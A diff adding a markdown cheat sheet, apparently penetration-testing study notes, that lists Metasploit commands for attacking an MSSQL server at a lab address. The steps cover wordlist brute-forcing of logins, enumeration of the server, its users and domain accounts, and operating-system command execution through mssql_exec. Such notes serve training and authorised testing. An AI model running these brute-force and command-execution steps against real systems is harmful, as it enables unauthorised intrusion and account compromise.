@@ -1,0 +1,83 @@
+# MSSQL ENUMERATION - PART 2
+
+---------------------------------------------------------------
+
+### Brute Force MSSQL login using METASPLOIT
+
+> - use auxiliary/scanner/mssql/mssql_login
+> - set RHOSTS 10.0.20.101
+> - set USER_FILE /root/Desktop/wordlist/common_users.txt
+> - set PASS_FILE /root/Desktop/wordlist/100-common-passwords.txt
+> - set verbose false
+> - run
+
+---------------------------------------------------------------
+
+### MSSQL enumeration module to find more informations.
+
+
+> - use auxiliary/admin/mssql/mssql_enum
+> - set RHOSTS 10.0.20.101
+> - exploit
+
+---------------------------------------------------------------
+
+### Extract all MSSQL users
+
+> - use auxiliary/admin/mssql/mssql_enum_sql_logins
+> - set RHOSTS 10.0.20.101
+> - exploit
+
+---------------------------------------------------------------
+
+### Execute commands on the target machine via MSSQL.
+
+> - use auxiliary/admin/mssql/mssql_exec
+> - set RHOSTS 10.0.20.101
+> - set CMD whoami
+> - exploit
+
+---------------------------------------------------------------
+
+### enum domain accounts module via MSSQL
+
+> - use auxiliary/admin/mssql/mssql_enum_domain_accounts
+> - set RHOSTS 10.0.20.101
+> - exploit
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
